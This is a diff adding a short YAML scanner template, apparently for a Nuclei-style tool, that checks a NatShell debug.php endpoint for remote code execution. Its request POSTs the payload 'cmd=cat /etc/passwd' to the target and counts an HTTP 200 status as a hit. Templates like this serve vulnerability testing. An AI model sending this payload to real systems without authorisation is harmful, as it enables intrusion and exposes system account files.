@@ -1,0 +1,21 @@
+id: natshell-rce
+brief:
+    title: NatShell Debug File - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: The NatShell debug file is susceptible to a remote code execution vulnerability.
+    label:
+        - natshell
+        - rce
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/debug.php'
+      body: |
+        cmd=cat /etc/passwd
+      signs:
+        - "on": status
+          status:
+            - 200
